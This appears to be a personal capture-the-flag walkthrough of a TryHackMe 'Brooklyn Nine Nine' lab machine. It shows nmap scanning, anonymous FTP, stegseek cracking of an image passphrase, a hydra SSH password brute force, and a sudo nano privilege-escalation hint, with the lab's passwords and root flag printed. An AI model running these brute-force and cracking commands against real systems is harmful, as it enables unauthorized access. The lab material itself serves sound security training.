target : 10.10.25.185

┌──(root㉿kali)-[/home/…/CTFs/Boot2root/tryhackme/rooms]
└─# nmap -sC -sV -Pn --min-rate 4000 10.10.25.185
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-27 17:55 EDT
Nmap scan report for 10.10.25.185
Host is up (7.9s latency).
Not shown: 954 closed tcp ports (reset), 43 filtered tcp ports (no-response)
PORT   STATE SERVICE    VERSION
21/tcp open  tcpwrapped
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.128.36
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  tcpwrapped
| ssh-hostkey: 
|   2048 167f2ffe0fba98777d6d3eb62572c6a3 (RSA)
|   256 2e3b61594bc429b5e858396f6fe99bee (ECDSA)
|_  256 ab162e79203c9b0a019c8c4426015804 (ED25519)
80/tcp open  tcpwrapped
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.52 seconds

found this : _End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
and here i cat it :
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

and also in the web page i found this comment : <!-- Have you ever heard of steganography? -->
i will download the image : http://10.10.25.185/brooklyn99.jpg
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# file brooklyn99.jpg 
brooklyn99.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 533x300, components 3
                                                                                        
using steghide and found nothing now i am trying to use stegseek and crack it :

┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# time stegseek -sf brooklyn99.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "admin")           
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".


real	0.20s
user	0.13s
sys	0.05s
cpu	91%

and here is what i found : ──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# cat brooklyn99.jpg.out 
Holts Password:
fluffydog12@ninenine : for holt user 

Enjoy!!
this password give me nothing but now i will crack jake pass using hydra:
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.25.185
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-27 18:09:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.25.185:22/
[22][ssh] host: 10.10.25.185   login: jake   password: 987654321
^C                                                                


PrivEsc
using sudo -l 
i see nano and then use gtfobins
root.txt
# cat *
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
# 







